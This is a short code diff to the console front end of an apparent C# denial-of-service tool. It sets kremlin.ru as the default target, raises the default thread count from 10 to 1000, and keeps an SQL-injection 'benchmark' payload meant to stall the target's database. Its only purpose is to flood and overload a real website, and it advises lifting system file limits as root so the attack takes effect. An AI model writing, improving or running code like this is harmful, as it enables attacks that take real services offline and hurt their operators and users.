@@ -13,6 +13,7 @@ namespace GAS.TUI
                     Console.WriteLine("Is file open limit unlocked?\r\nIf attack will not give any effect run \"ulimit -n<ShreadCount>*<SocketCount>*2+5000\" as root");
             Console.WriteLine("Select target[kremlin.ru]");
             string temp = Console.ReadLine();
+            temp = (temp == "" ? "kremlin.ru" : temp);
             bool IPOK = Core.LockOn(temp);
             if (!IPOK)
             {
@@ -20,7 +21,7 @@ namespace GAS.TUI
                 Environment.Exit(1);
             }
             Console.WriteLine("Subsite is {0}, do you want to change it?[y/n]", Core.Subsite);
-            if (Console.ReadLine().ToLower()[0] == 'y')
+            if (Console.ReadLine().ToLower() == "y")
                 Core.Subsite = Console.ReadLine();
             Console.WriteLine("Enter port[80]");
             Core.Port = int.Parse((temp = Console.ReadLine()) == "" ? "80" : temp);
@@ -32,8 +33,8 @@ namespace GAS.TUI
                 Core.Method = GAS.Core.AttackMethod.HTTP;
                 Core.Subsite += " and (select+benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f))";
             }
-            Console.WriteLine("Enter thread count[10]");
-            Core.Threads = int.Parse((temp = Console.ReadLine()) == "" ? "10" : temp);
+            Console.WriteLine("Enter thread count[1000]");
+            Core.Threads = int.Parse((temp = Console.ReadLine()) == "" ? "1000" : temp);
             Console.WriteLine("Enter sockets per thread [50]");
             Core.SPT = int.Parse((temp = Console.ReadLine()) == "" ? "50" : temp);
             Console.WriteLine("Enter delay [0]");
